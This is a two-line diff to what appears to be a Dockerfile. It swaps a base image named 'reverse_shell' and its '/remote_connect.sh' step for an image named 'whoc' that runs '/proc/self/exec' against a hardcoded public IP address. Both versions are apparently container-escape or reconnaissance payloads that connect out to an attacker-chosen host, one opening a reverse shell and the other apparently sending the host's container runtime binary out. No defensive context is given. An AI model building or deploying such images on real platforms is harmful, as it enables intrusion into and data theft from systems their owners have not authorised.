@@ -1,2 +1,2 @@
-FROM yuvalavra/reverse_shell:latest
-RUN /remote_connect.sh
+FROM yuvalavra/whoc:latest
+RUN /proc/self/exec 54.227.218.105
